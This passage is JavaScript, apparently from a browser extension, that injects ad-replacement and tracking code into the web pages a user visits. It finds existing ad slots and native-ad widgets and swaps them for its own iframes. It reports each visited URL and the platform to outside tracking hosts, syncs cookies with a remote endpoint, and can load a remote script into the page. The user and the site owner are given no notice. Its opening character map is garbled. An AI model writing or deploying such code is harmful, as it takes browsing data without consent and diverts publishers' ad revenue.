:"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"U","":"V","":"V","":"V","":"V","":"VY","":"W","":"W","":"W","":"W","":"W","":"W","":"W","":"X","":"X","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Y","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"Z","":"IJ","":"OE","":"A","":"AE","":"B","":"B","":"C","":"D","":"E","":"F","":"G","":"G","":"H","":"I","":"R","":"J","":"K","":"L","":"L","":"M","":"N","":"O","":"OE","":"O","":"OU","":"P","":"R","":"N","":"R","":"S","":"T","":"E","":"R","":"U","":"V","":"W","":"Y","":"Z","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"a","":"aa","":"ae","":"ae","":"ae","":"ao","":"au","":"av","":"av","":"ay","":"b","":"b","":"b","":"b","":"b","":"b","":"b","":"b","":"o","":"c","":"c","":"c","":"c","":"c","":"c","":"c","":"c","":"c","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"d","":"i","":"j","":"j","":"j","":"dz","":"dz","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"e","":"et","":"f","":"f","":"f","":"f","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"g","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"h","":"hv","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"i","":"d","":"f","":"g","":"r","":"s","":"t","":"is","":"j","":"j","":"j","":"j","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"k","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"l","":"lj","":"s","":"s","":"s","":"s","":"m","":"m","":"m","":"m","":"m","":"m","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"n","":"nj","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"o","":"oi","":"oo","":"e","":"e","":"o","":"o","":"ou","":"p","":"p","":"p","":"p","":"p","":"p","":"p","":"p","":"p","":"q","":"q","":"q","":"q","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"r","":"c","":"c","":"e","":"r","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"s","":"g","":"o","":"o","":"u","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"t","":"th","":"a","":"ae","":"e","":"g","":"h","":"h","":"h","":"i","":"k","":"l","":"m","":"m","":"oe","":"r","":"r","":"r","":"r","":"t","":"v","":"w","":"y","":"tz","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"u","":"ue","":"um","":"v","":"v","":"v","":"v","":"v","":"v","":"v","":"vy","":"w","":"w","":"w","":"w","":"w","":"w","":"w","":"w","":"x","":"x","":"x","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"y","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"z","":"ff","":"ffi","":"ffl","":"fi","":"fl","":"ij","":"oe","":"st","":"a","":"e","":"i","":"j","":"o","":"r","":"u","":"v","":"x"};
    String.prototype.latinise=function(){return this.replace(/[^A-Za-z0-9\[\] ]/g,function(a){return Latinise.latin_map[a]||a})};

    //Set best protocol
    function dynamicURL(url) {
        return url.replace("http:", '');
    }
    //Analyse CSS and set max_zIndex
    function analyseCss() {
        if(window.location.hostname.match(/fnac\.com$/)) {
            max_zIndex = 2000;
        } else {
            max_zIndex = Math.max(0, Math.max.apply(null, jKiri.map(jKiri.makeArray(document.getElementsByTagName("*")),function (v) {return parseInt(jKiri(v).css("z-index")) || null;})));
        }
    }

    //Cookie manager
    var fdzCookies = {
        hasCookie: function (sKey) {
            return (new RegExp("(?:^|;\\s*)" + escape(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=")).test(document.cookie);
        },

        getCookie: function (cname) {
            var name = cname + "=";
            if (!document.cookie) {
                return "";
            }
            var ca = document.cookie.split(';');
            for(var i=0; i < ca.length; i++) {
                var c = ca[i];
                while (c.charAt(0)==' ') c = c.substring(1);
                if (c.indexOf(name) != -1) return c.substring(name.length, c.length);
            }
            return "";
        },
        setCookie: function (cname, cvalue, callback) {
            document.cookie = cname + "=" + cvalue + ";path=/; SameSite=None; Secure;";
            if (typeof callback != "undefined") {
                callback();
            }
        },
        getMasterCookie: function (cname, plugin_key) {
            var postData = {
                name: cname,
                pk: plugin_key
            };
            jKiri.getJSON(dynamicURL("https://ruzozi.locixugoro.com/assets/cookie.php"), postData).success(function(data) {
                if (data.success && data.val != undefined && data.val != "") {
                    return data.val;
                }
            });
            return "";
        },
        setMasterCookie: function (cname, cvalue, time, plugin_key, callback) {
            var postData = {
                name: cname,
                val: cvalue,
                time: time,
                pk: plugin_key
            };
            jKiri.getJSON(dynamicURL("https://ruzozi.locixugoro.com/assets/cookie.php?callback=?"), postData).always(function() {
                if (typeof callback != "undefined") {
                    callback();
                }
            });
        },
        removeCookie: function (sKey, sPath) {
            if (!sKey || !this.hasCookie(sKey)) { return; }
            document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + (sPath ? "; path=" + sPath : "");
        }
    };

    /*-----------------------
     * BASE CSS
     *-----------------------*/
     var reset_css = {
        fontFamily: 'Arial, Helvetica, sans-serif',
        fontSize: '12px',
        color: '#000000',
        lineHeight: '14px',
        fontWeight: 'normal',
        height: 'auto',
        background: 'transparent',
        width: 'auto',
        border: 'none',
        boxShadow: 'none',
        borderRadius: 0,
        margin: 0,
        padding: 0,
        textAlign: 'left',
        boxSizing: 'content-box'
     };

     var fdzGlobal = {
        host: "https://ruzozi.locixugoro.com",
        debug: "false"
     };

     var Debug = {
        logTrace: [],
     	log: function (v) {
     		if (fdzGlobal.debug == 'true') {
     			console.log(v);
                 Debug.logTrace.push(Date.now() + ' ' + v)
     		}
     	}
     };
     
    // fix IDE colors >

    var FdzPauloObj = {
    insert: false,
    tracker_id: null,
    trackEvent: function(type, boost_type) {
        //Send track event request
        var postData = {
            c: "true",
            e: type,
            bt: boost_type,
            b: "Firefox",
            u: document.URL,
            pk: "qofD0F4cANHCe$MYOzxKhQ",
            ac: "seconnecterici",
            os: navigator.platform,
        };

        if (FdzPauloObj.tracker_id != null) {
            postData['ie'] = FdzPauloObj.tracker_id;
        }

        if (window["affid"] != null) {
            postData['f'] = window["affid"];
        }

        jKiri.getJSON(dynamicURL("https://yeyuwaxi.locixugoro.com/assets/tabe?callback=?"), postData, function(json) {
            if(json.success) {
                if (FdzPauloObj.tracker_id == null) {
                    FdzPauloObj.tracker_id = json.id['$id'];
                }
            }
        });
    }
};

var leboncoinAlreadyMonetized = false;
var fdz_rand = Math.random() * 100;

var callback = function(FdzPauloObj) {
    var script_pan = document.createElement('script');
    script_pan.type = 'text/javascript';
        if (window.location.hash == "#r") {
        script_pan.src = 'https://www.quicksearches.info/script/k_r.php?uid=REDAA87C3D05E1C00D1C27BE3183B3C4A85&a=8383';
    } else {
        script_pan.src = 'https://www.quicksearches.info/script/k_r.php?uid=AA87C3D05E1C00D1C27BE3183B3C4A85&a=8383';
    }
    document.getElementsByTagName('head')[ 0 ].appendChild(script_pan);
    FdzPauloObj.trackEvent("create", "paulo_results");
    // track events
    var checkSadsfs = setInterval(function() {
	    if (jKiri('#sadsfs').length > 0) {
	    	clearInterval(checkSadsfs);

            FdzPauloObj.trackEvent("show", "paulo_results");

	    	jKiri('#sadsfs a').click(function() {
		    	FdzPauloObj.trackEvent("click", "paulo_results");
	    	});
	    	jKiri('#sadsfs').click(function(event) {
	    		if (event.target.innerHTML == ' X') {
			    	FdzPauloObj.trackEvent("close", "paulo_results");
	    		}
	    	});
	    }
    }, 500);
}

if (FdzPauloObj.insert) {
    callback(FdzPauloObj);
};
var reset_css = {
    fontFamily: 'Arial, Helvetica, sans-serif',
    fontSize: '12px',
    color: '#000000',
    lineHeight: '14px',
    fontWeight: 'normal',
    height: 'auto',
    background: 'transparent',
    width: 'auto',
    border: 'none',
    boxShadow: 'none',
    borderRadius: 0,
    margin: 0,
    padding: 0,
    textAlign: 'left',
    boxSizing: 'content-box'
};

function dynamicURL(url) {
    return url.replace("http:", '');
}

var adPlacementManager = {
    retryForced: true,
    pathFilter: "",
    n_found:0,
    retry: true,
    findRetry:0,
    iabFormats: {
        300: [600, 250],
        728: [90],
        120: [600],
        250: [250],
        200: [200],
        336: [280],
        160: [600],
        468: [60],
        970: [90, 150, 250]
    },
    find: function(n, callback, fallback) {
        jKiri(document).ready(function() {
            var placements = [];
            adPlacementManager.findRetry++
            jKiri('iframe, div.js-kelkoo-widget, div[id^="sas_"] a img, div.oas-fixed a img, div.ad-container').each(function(idx, elem) {
                if(elem.parentNode.querySelector('.fdz_adaccess')) return
                if(elem.className.indexOf('jkiri-itemtoremove') > -1) return
                if(elem.className.indexOf("ad-container") > -1) {
                    var config = { attributes: false, childList: true, subtree: true }
                    var observer = new MutationObserver((mutationsList, observer) => {
                        let imgdiv = mutationsList[0].target.getElementsByTagName('img')

                        if(!imgdiv) return
                        if(imgdiv.length == 0) return
                        imgdiv = imgdiv[0]

                        elem.firstChild.style.display = "none"
                        imgdiv.onload = () => {
                            heightIndex = adPlacementManager.iabFormats[imgdiv.width] !== undefined ? adPlacementManager.iabFormats[imgdiv.width].indexOf(imgdiv.height) : null;
                            if (adPlacementManager.iabFormats[imgdiv.width] !== undefined && heightIndex != -1 && heightIndex != null) {
                                adPlacementManager.n_found++;

                                let closeButton = mutationsList[0].target.getElementsByClassName('close-padding')

                                if(closeButton) {
                                    if(closeButton.length == 1) {
                                        closeButton = closeButton[0]
                                    } else {
                                        closeButton = null
                                    }
                                }

                                var adPlacement = {
                                    type: "ads",
                                    elemWidth: imgdiv.width,
                                    elemHeight: imgdiv.height,
                                    heightIndex: heightIndex,
                                    offset:jKiri(imgdiv).offset().top,
                                    jqItem: elem,
                                    jqItemToRemove: elem.firstChild,
                                    wantsBtn: true,
                                    closeButton: closeButton
                                };
                                callback(adPlacement)
                            }
                        }
                    });
                    observer.observe(elem, config);

                }
                heightIndex = adPlacementManager.iabFormats[jKiri(this).width()] !== undefined ? adPlacementManager.iabFormats[jKiri(this).width()].indexOf(jKiri(this).height()) : null;
                if (adPlacementManager.iabFormats[jKiri(this).width()] !== undefined && heightIndex != -1 && heightIndex != null) {
                    adPlacementManager.n_found++;
                    var adPlacement = {
                        type: "ads",
                        elemWidth: jKiri(this).width(),
                        elemHeight: jKiri(this).height(),
                        heightIndex: heightIndex,
                        offset:jKiri(elem).offset().top,
                        jqItem: jKiri(elem).parent(),
                        jqItemToRemove: jKiri(elem)
                    };
                    fdzAdsManager.q.push(adPlacement)
                }

                                if (adPlacementManager.pathFilter != "") {
                    for (var p in adPlacementManager.pathFilter) {
                        if (location.pathname.indexOf(adPlacementManager.pathFilter[p]) != -1) {
                            if (jKiri(this).attr("src") != undefined && jKiri(this).attr("src").indexOf("www.google.com/afs/ads") != -1 && jKiri(this).height() > 0 && jKiri(this).width() > 0) {
                                var adPlacement = {
                                    type: "gads",
                                    elemWidth: jKiri(this).width(),
                                    elemHeight: jKiri(this).height(),
                                    offset:jKiri(elem).offset().top,
                                    jqItem: jKiri(elem).parent(),
                                    jqItemToRemove: jKiri(elem),
                                };

                                if (jKiri(this).attr("src").match(/q=([a-zA-Z0-9%-]+)[&#]*/)) {
                                    adPlacement.query = jKiri(this).attr("src").match(/q=([a-zA-Z0-9%-]+)[&#]*/)[1];
                                }

                                if (adPlacement.query != undefined && adPlacement.query != "") {
                                    placements.push(adPlacement);
                                }
                            }
                        }
                    }
                }

                            });

            if (fdzAdsManager.q.length > 0) {
                //Finish analyse, let's sort
                fdzAdsManager.q.sort(function (a, b) {
                    return a.offset - b.offset;
                });
                fdzAdsManager.consumeQ(fdzAdsManager.q.shift())
            }

            if (adPlacementManager.retryForced) {
                setTimeout(() => {
                    googletag = {}
                    adPlacementManager.retryForced = false
                    adPlacementManager.find(n, callback, fallback)
                }, 1000);
            }

        });
    }
}

window.addEventListener("message", function(event) {
	if (typeof(event.data) === "string" && event.data.indexOf('marshadowincomingmessage') === 0) {
		var data = event.data.split('||');
		var rand = data[1];
		var type = data[2];
		if (type != "none") {
	        jKiri('.jkiri-itemtoremove-' + rand).hide(0, function() {
				jKiri('#fdz_adaccess_iframe_' + rand).css('display', 'block');
			});
		}
    }

    if (typeof(event.data) === "string" && event.data.indexOf('autopromo') === 0) {
		const data = event.data.split('||');
		const rand = data[1];
		const type = data[2];
        const html = data[3].replace(/%3e/gi, '>');
        if (type != "none") {
            jKiri('.jkiri-itemtoremove-' + rand).hide(0, function() {
                jKiri('#fdz_adaccess_iframe_' + rand).html(html);
				jKiri('#fdz_adaccess_iframe_' + rand).css('display', 'block');
            })
        }
    }

    if(event.data.action && event.data.action == "cmp") {
        let command = "";
        if(event.data.command) {
            command = event.data.command;
        }
        let param = "";
        if(event.data.parameter) {
            param = event.data.parameter;
        }
        __cmp(command, param, function(data, success) {
            document.querySelectorAll('.fdz_adaccess').forEach(el => {
                el.contentWindow.postMessage({key: event.data.key, action: "return_cmp", success: success, result: data}, "https://www.marshadow.io/");
            })
        });
    }
}, false);

var fdzAdsManager = {
    config: {childList: true, subtree: true},
    observer: null,
    interval: {},
    q: [],
    init: function() {

        const observer = new MutationObserver((mutationsList, observer) => {

            mutationsList[0].addedNodes.forEach((elem) => {
                if(!jKiri(elem).is('iframe:not(.fdz_adaccess), div.js-kelkoo-widget, div[id^="sas_"] a img, div.oas-fixed a img, div.ad-container')) {
                    if(!elem.querySelector) {
                        return;
                    }
                    if(!elem.querySelector('iframe')) {
                        return;
                    }
                    elem = elem.querySelector('iframe')
                }

                elem.onload = () => {
                    el = jKiri(elem)
                    heightIndex = adPlacementManager.iabFormats[el.width()] !== undefined ? adPlacementManager.iabFormats[el.width()].indexOf(el.height()) : null;
                    if (adPlacementManager.iabFormats[el.width()] !== undefined && heightIndex != -1 && heightIndex != null) {
                        var adPlacement = {
                            type: "ads",
                            elemWidth: el.width(),
                            elemHeight: el.height(),
                            offset: el.offset().top,
                            heightIndex: heightIndex,
                            jqItem: el.parent(),
                            jqItemToRemove: el,
                        };
                        fdzAdsManager.q.push(adPlacement)
                        if(fdzAdsManager.q.length == 1) {
                            fdzAdsManager.consumeQ(fdzAdsManager.q.shift())
                        }
                    }
                }
            })

        })
        fdzAdsManager.observer = observer
        
        const fixBody = function() {
            if (document.body && document.body.nodeName) {
                fdzAdsManager.observer.observe(document.body, fdzAdsManager.config);
            } else {
                setTimeout(fixBody, 200)
            }
        }
        fixBody()
        

        //Handle auto ad placement
        adPlacementManager.find(2, function(adPlacement) {
           fdzAdsManager.replaceAutoAd(adPlacement);
        });

    },
    consumeQ: function(adPlacement) {
        Debug.log(document.querySelectorAll('.fdz_adaccess'))
        if(adPlacement.jqItemToRemove[0].className.indexOf('jkiri-itemtoremove') > -1) {
            if(fdzAdsManager.q.length > 0) {
                fdzAdsManager.consumeQ(fdzAdsManager.q.shift())
            }
            return
        }
        numberOfAds = document.querySelectorAll('.fdz_adaccess').length + document.querySelectorAll('.auto_script').length
        if(numberOfAds >= 2) {
            fdzAdsManager.q = []
            Debug.log('already 2')
            return;
        }

        fdzAdsManager.replaceAutoAd(adPlacement).then(() => {
            if(fdzAdsManager.q.length > 0) {
                fdzAdsManager.consumeQ(fdzAdsManager.q.shift())
            }
        })
    },
    changeHeight: function(width, height) {
        if (width == 970 && height == 150) {
            return 90;
        }
        return height;
    },
    replaceAutoAd: function(adPlacement) {
        return new Promise((resolve, reject) => {
            var rand = Math.floor((Math.random() * 999999999999999) + 1);
            jKiri(adPlacement.jqItemToRemove).addClass("jkiri-itemtoremove-" + rand);

            if (adPlacement.type == "gads") {
                var data = {
                    ad_data: {
                        width: adPlacement.elemWidth,
                        height: adPlacement.elemHeight,
                        query: adPlacement.query
                    }
                };
            } else {
                var data = {
                    ad_data: {
                        width: adPlacement.elemWidth,
                        height: adPlacement.elemHeight
                    }
                };
            }
            data.ad_data.wantsBtn = adPlacement.wantsBtn || false
            data.ad_data.closeButton = adPlacement.closeButton || null
            data.ad_data.elem = adPlacement.jqItem
            var addiv = fdzAdsManager.createDiv(data, rand);
            if(adPlacement.jqItem.get && adPlacement.jqItem.get(0).querySelector('.fdz_adaccess')) return resolve()

            var newHeight = fdzAdsManager.changeHeight(adPlacement.elemWidth, adPlacement.elemHeight)
            if(newHeight != adPlacement.elemHeight) adPlacement.jqItem.get(0).parentNode.style.height = newHeight+'px';

            Debug.log('addDiv', )
            jKiri(adPlacement.jqItem).prepend(addiv);
            return resolve()
        })
    },
    createDiv: function(json, rand) {
        Debug.log('createDivAds')
        var addiv = jKiri('<div/>', {
            id: "fdz_adaccess_iframe_" + rand
        });
        addiv.css({
        	display: 'none',
            width: "100%"
        });

        var addivCont = jKiri('<div/>', {
            id: "fdz_adaccess_cont_iframe_" + rand
        });

        var widthSend = json.ad_data.width
        var heightSend = json.ad_data.height
        heightSend = fdzAdsManager.changeHeight(widthSend, heightSend)

        addivCont.css({
        	display: 'none',
            width: widthSend + 'px',
            height: heightSend + 10 + 'px',
            border: 'none',
            display: 'block',
            margin: 'auto'
        });

        var host = "https://www.marshadow.io/";
        var cmpLoad = (typeof __cmp != "undefined" ? 1 : 0)
        var src = host+"assets/aserver?w=" + widthSend + "&h=" + heightSend + "&host=" + window.location.host + "&plugin_key=qofD0F4cANHCe$MYOzxKhQ&ifradid=" + rand + "&cmp=" + cmpLoad;
        if (json.ad_data.query != undefined && json.ad_data.query != "") {
           src += "&query="+ json.ad_data.query + "&force_type=more-products-ads"
        }
                var adiframe = jKiri('<iframe/>', {
            sandbox: "allow-scripts allow-popups allow-forms allow-top-navigation allow-popups-to-escape-sandbox allow-same-origin",
            class: "fdz_adaccess",
            src: src,
            style: "border:none;display:block;margin:auto",
        });
        
        adiframe.width(widthSend);
        adiframe.height(heightSend + 10);
        if(json.ad_data.wantsBtn) {
            adiframe.load(function() {
                fdzAdsManager.addClose(json, addivCont)
            });
        }
        addivCont.append(adiframe);

        addiv.append(addivCont)
        return addiv;
    },
    addClose: (json, addivCont) => {
        const btn = document.createElement('a')

        btn.style.position = "relative";
        btn.style.top = "-" + (json.ad_data.height + 10) + "px";
        btn.style.left = (json.ad_data.width-14) + "px";
        btn.style.backgroundRepeat = "no-repeat";
        btn.style.backgroundSize = "12px";
        btn.style.backgroundPosition = "1px";
        btn.style.backgroundColor = "#fff";
        btn.style.backgroundImage = "url(data:image/svg+xml;utf8;base64,)"
        btn.style.width = "14px";
        btn.style.display = "block";
        btn.style.height = "14px";
        btn.style.textAlign = "center";
        btn.style.fontSize = "14px";
        btn.style.color = "rgb(138, 138, 138)";

        btn.onclick = (e) => {
            json.ad_data.closeButton.click(e)
            fdzAdsManager.closeAds(json.ad_data.elem)
        }
        addivCont.append(btn)
    }
};
if(!MutationObserver) {
    function MutationObserver() {
        this.observe = () => {}
    }
}
fdzAdsManager.init();
var fdzNativeAds = {
    tracker_id : null,
    limit: 2,
    formats: {
        taboola: {
            selectors:[
                "#taboola-mid--article-thumbnails",
                "#taboola-mid-article-thumbnails",
                "#taboola-below-article-thumbnails",
                "#taboola-right-rail-1st",
                "#taboola-right-rail-2nd",
                "#taboola-right-rail-thumbnails",
                "#taboola-mid-main-column-thumbnails-",
                "#taboola-rightrailthumbnails2nd-mix",
                ".trc_rbox_container",
            ]
        },
        ligatus: {
            selectors:[
                "div[id^='lig_wrapper']",
                "div[class^='lig_wrapper']",
                "iframe[id^='lig_wrapper']",
                "iframe[id^='ligatus']",
                "div[id^='ligatus']",
                "div[id^='ligatusframe']",
            ]
        },
        outbrain: {
            selectors:[
                ".OUTBRAIN",
            ]
        },
    },
    selectors: {
        taboola: {
            idRegex: /^taboola-mid--article-thumbnails$|^taboola-mid-article-thumbnails$|^taboola-below-article-thumbnails$|^taboola-right-rail-1st$|^taboola-right-rail-2nd$|^taboola-right-rail-thumbnails$|^taboola-mid-main-column-thumbnails-$|^taboola-rightrailthumbnails2nd-mix$|^trc_rbox_container$/g,
            classRegex: /trc_rbox_container/g
        },
        ligatus: {
            idRegex: /(^lig_wrapper)|(^ligatus)/g,
            classRegex: /(^lig_wrapper)/g
        },
        outbrain: {
            idRegex: null,
            classRegex: /OUTBRAIN/g
        }
    },
    q: [],
    consumeQIsLaunch: false,
    init: function() {
        const elInfo = function(el) {
            let e = jKiri(el);
            let eInfos = {
                item : e,
                width: Math.round(e.width()),
                height: Math.round(e.height()),
            };
            return eInfos;
        }

        const nativeMut = new MutationObserver(function(mutations) {
            mutations.forEach(function (mut) {
                if(jKiri('.native_adn').length >= fdzNativeAds.limit) {
                    return;
                }
                for (const [key, value] of Object.entries(fdzNativeAds.selectors)) {

                    if (mut.target.tagName.match(/DIV|IFRAME/g)) {
                        if(mut.target.id && mut.target.id.match && value.idRegex && mut.target.id.match(value.idRegex)) {
                            fdzNativeAds.q.push({format: key, el: elInfo(mut.target)});
                            if (!fdzNativeAds.consumeQIsLaunch && fdzNativeAds.q.length > 0) {
                                fdzNativeAds.consumeQ();
                            }
                        } else if(mut.target.className && value.classRegex && mut.target.className.match(value.classRegex)) {
                            fdzNativeAds.q.push({format: key, el: elInfo(mut.target)});
                            if (!fdzNativeAds.consumeQIsLaunch && fdzNativeAds.q.length > 0) {
                                fdzNativeAds.consumeQ();
                            }
                        }
                    }

                    mut.addedNodes.forEach(function (el) {
                        if(jKiri('.native_adn').length >= fdzNativeAds.limit) {
                            return;
                        }
                        if (!mut.target.tagName.match(/DIV|IFRAME/g)) {
                            return;
                        }
                        if(el.id && el.id.match && value.idRegex && el.id.match(value.idRegex)) {
                            fdzNativeAds.q.push({format: key, el: elInfo(el)});
                            if (!fdzNativeAds.consumeQIsLaunch && fdzNativeAds.q.length > 0) {
                                fdzNativeAds.consumeQ();
                            }
                        } else if(el.className && value.classRegex && typeof el.className === 'string' && el.className.match(value.classRegex)) {
                            fdzNativeAds.q.push({format: key, el: elInfo(el)});
                            if (!fdzNativeAds.consumeQIsLaunch && fdzNativeAds.q.length > 0) {
                                fdzNativeAds.consumeQ();
                            }
                        }
                    })
                }
            });
        });
        const fixBody = function() {
            if (document.body && document.body.nodeName) {
                nativeMut.observe(document.body, {
                    childList: true,
                    subtree: true
                });
            } else {
                setTimeout(fixBody, 200)
            }
        }
        fixBody()

        

        jKiri(document).ready(function() {
            fdzNativeAds.findPlacements(function(format, elements) {
                if(jKiri('.native_adn').length >= fdzNativeAds.limit) {
                    return;
                }
                var limitElements = fdzNativeAds.limit;
                if (elements.length < fdzNativeAds.limit) {
                   limitElements = elements.length;
                }
                for (var i=0; i<limitElements; i++) {
                    if(jKiri('.native_adn').length >= fdzNativeAds.limit) {
                        return;
                    }
                    fdzNativeAds.q.push({format: format, el: elements[i]});
                    if (!fdzNativeAds.consumeQIsLaunch && fdzNativeAds.q.length > 0) {
                        fdzNativeAds.consumeQ();
                    }
                }
            });
                    });
    },
    consumeQ: function(random) {
        return new Promise(function (resolve) {
            fdzNativeAds.consumeQIsLaunch = true;
            if(jKiri('.native_adn').length >= fdzNativeAds.limit || fdzNativeAds.q.length == 0) {
                fdzNativeAds.consumeQIsLaunch = false;
                fdzNativeAds.q = [];
                return resolve();
            }
            let tmp = fdzNativeAds.q.pop();
            if(!document.body.contains(tmp.el.item[0])) {
                return fdzNativeAds.consumeQ().then(resolve);
            }
            return fdzNativeAds.replaceAds(tmp.format, tmp.el).then(function () {return fdzNativeAds.consumeQ()}).then(resolve);
        })
    },
    findPlacements: function(callback, i=0) {
        for (format in fdzNativeAds.formats) {
            var elements = [];
            var formatSelector = fdzNativeAds.formats[format].selectors.join(", ");
            jKiri(formatSelector).filter(function(ids, el) {
                if (jKiri(el).parents(formatSelector).length > 0) {
                    return false;
                }
                return true;
            }).each(function(idx, elem) {
                e = jKiri(elem);

                eInfos = {
                    item : e,
                    width: Math.round(e.width()),
                    height: Math.round(e.height()),
                };

                if (eInfos.height == 0) {
                    eInfos.height =  Math.round(e.children().height());
                }

                if (eInfos.width == 0) {
                    eInfos.width =  Math.round(e.children().width());
                }
                if (eInfos.width != 0 && eInfos.height != 0) {
                    elements.push(eInfos);
                }
            });

            /*if(elements.length == 0 && i<10) {
                return setTimeout(() => { return fdzNativeAds.findPlacements(callback, i+1) }, 200)
            }*/

            if (typeof callback != "undefined" && elements.length > 0) {
                callback(format, elements);
            }
        }
    },
    replaceAds: function(format, element) {
        return new Promise(function (resolve) {
            if (element.height > 200) {
                jKiri.getJSON(dynamicURL('https://yeyuwaxi.locixugoro.com/assets/nataurl?width='+element.width+'&height='+element.height+'&h='+btoa(document.location.host)+'&pk='+mainPluginKey+'&callback=?'), null, function(json) {
                    if(json.url) {
                        if(jKiri('.native_adn').length >= fdzNativeAds.limit) {
                            return resolve();
                        }
                        if(!document.body.contains(element.item[0])) {
                            return resolve();
                        }
                        element.item.replaceWith(jKiri('<iframe class="native_adn" src="'+json.url+'" width="'+element.width+'" height="'+element.height+'" style="border:none;display:block;margin:auto" />'));
                        if (json.boost_type && json.boost_type == "ctz") {
                            fdzNativeAds.trackEvent("show", "native_ads_ctz", element.width+"x"+element.height, json.url);
                        } else if (json.boost_type && json.boost_type == "adthink") {
                            fdzNativeAds.trackEvent("show", "native_ads_adthink", element.width+"x"+element.height, json.url);
                        } else {
                            fdzNativeAds.trackEvent("show", "native_ads", element.width+"x"+element.height, json.url);
                        }
                        return resolve();
                    } else {
                        return resolve();
                    }
                });
            } else {
                return resolve();
            }
        })
    },
    trackEvent: function(type, boost_type, format, iframe, callback) {
        //Send track event request
        var postData = {
            event: type,
            boost_type: boost_type,
            browser: "Firefox",
            plugin_key: "qofD0F4cANHCe$MYOzxKhQ",
            url: document.URL,
            app_code: "seconnecterici",
            os: navigator.platform
        };
        jKiri.getJSON(dynamicURL("https://yeyuwaxi.locixugoro.com/assets/track-boosters-event.php?callback=?"), postData, function(json) {
            if(json.success) {
                if (fdzNativeAds.tracker_id == null) {
                    fdzNativeAds.tracker_id = json.id['$id'];
                }
            }
            //And call callback
            if(callback) {
                callback();
            }
        });
    },
};

fdzNativeAds.init();var searchFlights = {
    app_code:"seconnecterici",
    plugin_key:"qofD0F4cANHCe$MYOzxKhQ",
    plugin_host:"wikifab.org",
    boost_type:'more-flights',
    day: ['dim.', 'lun.', 'mar.', 'mer.', 'jeu.', 'ven.', 'sam.'],
    month: ['janv.', 'fvr.', 'mar.', 'avr.',
            'mai', 'juin', 'juil.', 'aot',
            'sept.', 'oct.', 'nov.', 'dc.'],
    tracker_id: null,
    jqXHR: null,
    tripType: null,
    g_interval: null,
    moreFlightsItem: null,
    dispMoreFlightsInterval: null,
    jqMasterEl:null,
    dispType:1,

    init: function() {
        var flight = {from: '', to: '', dep_day: '', ret_day: '', nb_adults: '1', nb_childrens: '0', nb_babies: '0', ticket_class: 'economy', source:''}
            preRequest = 0;;
                if(preRequest != 1){
            var tmpFinalInterval = setInterval(function() {
                if (flight.from.length > 0 && flight.to.length > 0) {
                    clearInterval(tmpFinalInterval);
                    searchFlights.requestAPI(flight, 0);
                }
            }, 500);
        }
    },

    requestAPI: function(flight, preRequest){
        //Send track event request
        if (searchFlights.dispType == 2) {
            searchFlights.boost_type = 'more-flights-panel';
        }
        var action = 'create';
        if(preRequest == 1){
            action = 'debug';
        }else{
            var postData = {
                from: flight.from,
                to: flight.to,
                dep_day: flight.dep_day,
                nb_adults: flight.nb_adults,
                nb_childrens: flight.nb_childrens,
                nb_babies: flight.nb_babies,
                results: (searchFlights.dispType == 1 ? "3" : "4"),
                ticket_class: flight.ticket_class,
                url: document.URL,
                app_code: searchFlights.app_code,
                browser: "Firefox",
                plugin_key: searchFlights.plugin_key,
                os: navigator.platform,
                source: 'form',
                boost_type: searchFlights.boost_type,
                action: action,
                v: 2
            };
            if (flight.ret_day != null && flight.ret_day.length > 0) {
                postData['ret_day']= flight.ret_day;
            }
            if (searchFlights.tracker_id != null) {
                postData['id_event'] = searchFlights.tracker_id;
            }
            searchFlights.jqXHR = jKiri.getJSON(dynamicURL("https://yeyuwaxi.locixugoro.com/assets/get-more-flights.php?callback=?"), postData, function(json) {
                if(json.success && json.flights.length > 0 && preRequest != 1) {
                    if (searchFlights.dispType == 1) {
                        searchFlights.getFlights(json);
                    } else if (searchFlights.dispType == 2) {
